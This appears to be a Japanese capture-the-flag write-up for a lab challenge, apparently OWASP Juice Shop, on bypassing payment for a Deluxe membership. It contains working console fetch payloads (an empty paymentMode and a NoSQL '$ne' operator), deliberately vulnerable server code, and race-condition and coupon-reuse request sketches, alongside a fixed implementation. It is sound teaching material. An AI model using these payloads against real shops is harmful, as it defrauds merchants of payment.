# Deluxe Fraud ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** ビジネスロジック / 入力検証
**目標:** 支払い無しで Deluxe メンバーシップを取得

---

## 背景知識

### ビジネスロジック脆弱性とは

ビジネスロジック脆弱性は、**アプリケーションのビジネスルールや処理フローの欠陥を悪用する攻撃**。SQLi や XSS のような技術的な脆弱性とは異なり、アプリケーションが「想定通りに動作している」にも関わらず、設計上の欠陥により悪用される。

```
┌─────────────────────────────────────────────────────────────────┐
│                     正常な購入フロー                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ユーザー                                 サーバー              │
│      │                                        │                │
│      │  1. Deluxe ページにアクセス            │                │
│      │ ─────────────────────────────────────▶ │                │
│      │                                        │                │
│      │  2. 支払い方法を選択                   │                │
│      │     (card, wallet, etc.)               │                │
│      │                                        │                │
│      │  3. POST { paymentMode: "card" }       │                │
│      │ ─────────────────────────────────────▶ │                │
│      │                                        │                │
│      │             4. 支払い処理を実行         │                │
│      │             5. メンバーシップを付与     │                │
│      │                                        │                │
│      │  6. 成功！ Deluxe 会員になりました      │                │
│      │ ◀───────────────────────────────────── │                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                     攻撃フロー                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻撃者                                サーバー                 │
│      │                                    │                    │
│      │  POST { paymentMode: "" }  ← 空文字！                   │
│      │ ─────────────────────────────────▶ │                    │
│      │                                    │                    │
│      │             paymentMode が空...    │                    │
│      │             支払い処理をスキップ 😱 │                    │
│      │             メンバーシップを付与！  │                    │
│      │                                    │                    │
│      │  成功！ 支払い無しで Deluxe 会員に │                    │
│      │ ◀───────────────────────────────── │                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 日常的な例え

会員制ジムの入会手続きを想像してください:

- **正しい処理**: 支払い方法を選択 → 支払い完了 → 会員証発行
- **脆弱な処理**: 支払い方法を「空欄」にしたら → 支払いスキップ → 会員証発行

「支払い方法が空」という状態を想定していなかったため、チェックが抜けている。

### なぜ起こるのか

```javascript
// 脆弱なコードパターン
function purchaseDeluxe(paymentMode) {
  // paymentMode が指定されていれば支払い処理
  if (paymentMode) {
    processPayment(paymentMode);  // 支払い処理
  }
  // ↑ paymentMode が空文字だと、この if を通過してしまう
  //   しかし空文字は truthy ではないので支払い処理はスキップ

  // メンバーシップ付与（常に実行される！）
  grantDeluxeMembership();
}
```

---

## 思考プロセス

### ステップ1: Deluxe 会員の購入フローを分析

```
「Deluxe メンバーシップページにアクセス」
    ↓
「支払い方法を選択する画面がある」
    ↓
「Card、Wallet、Bitcoin などの選択肢」
    ↓
「選択して購入ボタンを押すとAPI呼び出し」
```

### ステップ2: APIリクエストを観察

```
「DevTools → Network で購入時のリクエストを確認」
    ↓
「POST /rest/deluxe-membership」
「Body: { paymentMode: "card" }」
    ↓
「paymentMode パラメータが支払い方法を指定」
```

### ステップ3: バイパスを試行

```
「paymentMode を変えてみる」
    ↓
「存在しない値: "free" → エラー」
「null: → エラー」
「空文字: "" → ...成功！？」
    ↓
「空文字を送ると支払い処理がスキップされる」
```

### ステップ4: NoSQLi の可能性も検討

```
「paymentMode に演算子を入れたらどうなる？」
    ↓
「{ paymentMode: {"$ne": ""} } を試す」
    ↓
「これでも成功する可能性（NoSQLi）」
```

---

## 実行手順

### Step 1: ログインする

任意のユーザーでログイン（例: 新規登録したユーザー）

### Step 2: Deluxe メンバーでないことを確認

`/#/deluxe-membership` にアクセスし、「Become a member」ボタンが表示されていることを確認。

### Step 3: 攻撃を実行

Console で以下を実行:

```javascript
// 方法1: 空文字で支払いをバイパス
const result = await fetch('/rest/deluxe-membership', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({ paymentMode: '' })
}).then(r => r.json());

console.log('Result:', result);
// → { status: "success", data: { membershipCost: 49, ... } }
```

```javascript
// 方法2: NoSQLi で支払いをバイパス（代替手法）
const result = await fetch('/rest/deluxe-membership', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({ paymentMode: {"$ne": ""} })
}).then(r => r.json());

console.log('Result:', result);
```

### Step 4: 結果を確認

ページをリロードすると、Deluxe メンバーシップが有効になっている。

```javascript
// 確認コマンド
const whoami = await fetch('/rest/user/whoami', {
  headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
}).then(r => r.json());

console.log('Deluxe Token:', whoami.user.deluxeToken);
// → 空でなければ Deluxe 会員
```

---

## 脆弱なコードパターン

```javascript
// ❌ 脆弱なコード
app.post('/rest/deluxe-membership', async (req, res) => {
  const { paymentMode } = req.body;

  // 支払い方法が指定されていれば支払い処理
  if (paymentMode) {  // ← 空文字は falsy なのでスキップされる
    await processPayment(paymentMode, DELUXE_PRICE);
  }

  // メンバーシップ付与（支払い有無に関係なく実行）
  await user.update({ deluxeToken: generateToken() });

  res.json({ status: 'success' });
});
```

### 問題点

1. **検証の欠如**: `paymentMode` が有効な値かチェックしていない
2. **フロー分離の失敗**: 支払いとメンバーシップ付与が独立している
3. **デフォルト動作の危険性**: 空の場合にエラーではなく処理続行

---

## 安全な実装

```javascript
// ✅ 安全なコード
const VALID_PAYMENT_MODES = ['card', 'wallet', 'bitcoin'];

app.post('/rest/deluxe-membership', async (req, res) => {
  const { paymentMode } = req.body;

  // 1. 支払い方法の検証（ホワイトリスト）
  if (!paymentMode || !VALID_PAYMENT_MODES.includes(paymentMode)) {
    return res.status(400).json({ error: 'Invalid payment mode' });
  }

  // 2. 支払い処理（必須）
  const paymentResult = await processPayment(paymentMode, DELUXE_PRICE);

  if (!paymentResult.success) {
    return res.status(402).json({ error: 'Payment failed' });
  }

  // 3. 支払い成功時のみメンバーシップ付与
  await user.update({ deluxeToken: generateToken() });

  res.json({ status: 'success' });
});
```

### 対策のポイント

| 対策 | 説明 |
|------|------|
| **ホワイトリスト検証** | 許可された支払い方法のみ受け付け |
| **必須パラメータ検証** | 空や undefined を拒否 |
| **支払いの必須化** | 支払い成功を条件にメンバーシップ付与 |
| **トランザクション** | 支払いと付与を一連の処理として扱う |

---

## 他のビジネスロジック攻撃パターン

### クーポンの多重使用

```javascript
// 同じクーポンを複数回適用
POST /api/cart/apply-coupon  → { "code": "SAVE10" }
POST /api/cart/apply-coupon  → { "code": "SAVE10" }  // 2回目も成功？
```

### 価格競合状態（Race Condition）

```javascript
// 同時に購入リクエストを送信
Promise.all([
  fetch('/purchase', { body: { itemId: 1 } }),
  fetch('/purchase', { body: { itemId: 1 } })
]);
// → 在庫1個なのに2つ購入できる可能性
```

### 注文フローの途中スキップ

```
通常: カート → 住所 → 支払い → 確認 → 完了
攻撃: カート → 完了（支払いをスキップ）
```

---

## 関連チャレンジ

- [Payback Time](payback-time.md) - 負の数量で返金
- [NoSQL Manipulation](../difficulty-4/nosql-manipulation.md) - NoSQLi のテクニック
- [Forged Coupon](../difficulty-5-6/forged-coupon.md) - クーポンの偽造

## 参考リンク

- [OWASP Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)
- [PortSwigger - Business Logic Vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [CWE-840: Business Logic Errors](https://cwe.mitre.org/data/definitions/840.html)
